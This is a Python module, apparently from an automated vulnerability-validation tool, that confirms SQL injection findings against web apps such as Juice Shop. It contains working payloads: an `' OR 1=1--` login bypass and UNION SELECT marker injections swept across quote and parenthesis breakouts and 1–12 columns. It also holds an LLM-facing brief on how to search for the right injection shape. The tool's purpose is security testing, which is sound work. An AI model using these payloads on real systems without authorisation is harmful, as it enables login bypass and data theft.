"""SQL injection playbook.

Two shapes:

* Auth bypass (login endpoints): log in with `' OR 1=1--` where a wrong password
  normally fails -- oracle = we received a token we should not have.
* Generic parameter: UNION-inject a unique marker into every selected column and
  confirm the marker comes back in the response (data we chose appeared in the
  results); a benign query must NOT contain it.

The deterministic pass only tries a couple of GENERIC breakout/column shapes. Real
apps vary (Juice Shop's search needs a double-paren breakout and 9 columns), so
when the generic shapes error out (500) the finding is left UNRESOLVED and the
adaptive layer reasons the right shape from the error + the domain brief below.
"""

from __future__ import annotations

from ..models import Finding, Step, StepResult, VerdictType, VulnClass
from .base import SQLI_MARKER, OracleOutcome, split_path_params, token_from

VULN_CLASS = VulnClass.SQLI

_AUTH_HINTS = ("login", "authenticate", "signin")
_NOMATCH = "zzq7nomatch"   # a value that matches no real row

# Read by the adaptive layer (agent.py) when the deterministic pass is unresolved.
DOMAIN_BRIEF = """\
class: SQLI (a parameter reflected into a query over rows)
goal: make a marker string we inject appear in a response where a benign query
      never returns it (marker present in an attack response, absent in baseline).
context: the parameter is typically used inside a LIKE '%...%' clause, sometimes
      wrapped in parentheses, so the breakout may need to close a quote AND 0-2
      parentheses. Candidate breakouts to try:  '   ')   '))   ")   "))
method (UNION): put the marker in EVERY selected column so it surfaces whichever
      column maps to a visible field; end with  -- -  to comment out the rest.
efficient_search: in ONE attempt, BATCH a full sweep as separate attack steps --
      for each candidate breakout, emit one step per column count from 1 to 12
      (marker repeated in every column). The harness runs them all at once and the
      oracle flags any step whose response contains the marker. A 500 only means
      that particular breakout/column-count was wrong; keep sweeping the rest.
give_up_when: budget exhausted -> INCONCLUSIVE (never a false positive by timeout).
"""


def _is_auth(finding: Finding) -> bool:
    path = finding.target.uri.lower()
    param = (finding.target.param or "").lower()
    return any(h in path for h in _AUTH_HINTS) or param in ("email", "password", "username")


def _marker_cols(n: int) -> str:
    """`'MARKER','MARKER',...` -- marker in every column."""
    return ",".join(f"'{SQLI_MARKER}'" for _ in range(n))


def _bo_id(bo: str) -> str:
    return bo.replace("'", "q").replace('"', "d").replace(")", "p").replace("(", "P") or "none"


def expand_sweep(finding: Finding, breakouts: list[str], max_columns: int = 12) -> list[Step]:
    """Turn an LLM 'sweep' tactic into concrete steps: breakouts x column counts,
    marker in every column. LLM picks the strategy; the code does the search."""
    path, params = split_path_params(finding.target.uri)
    p = finding.target.param or (next(iter(params), None) or "q")
    method = finding.target.method or "GET"
    bos = [b for b in (breakouts or ["'", "')", "'))"]) if isinstance(b, str)][:5]
    cols = range(1, max(1, min(int(max_columns or 12), 12)) + 1)
    steps: list[Step] = []
    for bo in bos:
        for n in cols:
            merged = dict(params)
            merged[p] = f"{_NOMATCH}{bo} UNION SELECT {_marker_cols(n)}-- -"
            steps.append(Step(id=f"sweep_{_bo_id(bo)}_{n}", method=method, path=path,
                              params=merged, note=f"sweep breakout={bo!r} cols={n}"))
    return steps


def build_steps(finding: Finding, target_base: str) -> list[Step]:
    path, params = split_path_params(finding.target.uri)

    if _is_auth(finding):
        return [
            Step(id="baseline", method="POST", path=path,
                 json_body={"email": "nobody@validator.test", "password": "wrong-pw"},
                 note="baseline: legit-but-wrong login"),
            Step(id="attack", method="POST", path=path,
                 json_body={"email": "' OR 1=1--", "password": "x"},
                 note="attack: SQLi auth bypass"),
            Step(id="control", method="POST", path=path,
                 json_body={"email": "zzz-not-a-user@validator.test", "password": "x"},
                 note="control: another failing login"),
        ]

    # Generic parameter -> a couple of common UNION shapes. If these miss (500),
    # the finding stays UNRESOLVED and the adaptive layer infers the right shape.
    p = finding.target.param or (next(iter(params), None) or "q")
    method = finding.target.method or "GET"

    def variant(pid: str, payload: str, note: str) -> Step:
        merged = dict(params)
        merged[p] = payload
        return Step(id=pid, method=method, path=path, params=merged, note=note)

    return [
        variant("baseline", _NOMATCH, "baseline: a value matching no row"),
        variant("attack_q1", f"{_NOMATCH}' UNION SELECT '{SQLI_MARKER}'-- -",
                "attack: 1-col UNION, single-quote breakout"),
        variant("attack_q3", f"{_NOMATCH}' UNION SELECT {_marker_cols(3)}-- -",
                "attack: 3-col UNION, single-quote breakout"),
    ]


def oracle(finding: Finding, results: dict[str, StepResult]) -> OracleOutcome:
    if _is_auth(finding):
        b, a, c = results.get("baseline"), results.get("attack"), results.get("control")
        if not a:
            return OracleOutcome(VerdictType.AGENT_FAILURE, "attack step did not run")
        tok_a = token_from(a)
        tok_b = token_from(b) if b else None
        tok_c = token_from(c) if c else None
        if tok_a and not tok_b and not tok_c:
            return OracleOutcome(VerdictType.CONFIRMED,
                                 "auth bypass: injection returned a token, normal logins did not",
                                 ["baseline", "attack", "control"])
        if a.status and a.status >= 500:
            return OracleOutcome(None, "injection caused a 500 (error-based hint, not proof)")
        return OracleOutcome(VerdictType.FALSE_POSITIVE,
                             "no token obtained via injection; login stays protected")

    # Parameter UNION-marker check: our chosen marker must appear in an attack
    # response but not in the benign baseline. Works for deterministic AND for any
    # LLM-crafted attack step (it just has to embed the marker).
    baseline = results.get("baseline")
    base_has_marker = bool(baseline and baseline.body and SQLI_MARKER in baseline.body)
    saw_500 = False
    for sid, res in results.items():
        if sid == "baseline":
            continue
        if res.status and res.status >= 500:
            saw_500 = True
            continue
        if res.body and SQLI_MARKER in res.body and not base_has_marker:
            return OracleOutcome(VerdictType.CONFIRMED,
                                 "UNION SQLi: injected marker appeared in the results",
                                 ["baseline", sid])
    if saw_500:
        return OracleOutcome(None, "server error on injection (breakout/column count wrong; needs a refined payload)")
    return OracleOutcome(VerdictType.FALSE_POSITIVE,
                         "injected marker never reflected; parameter looks parameterized")
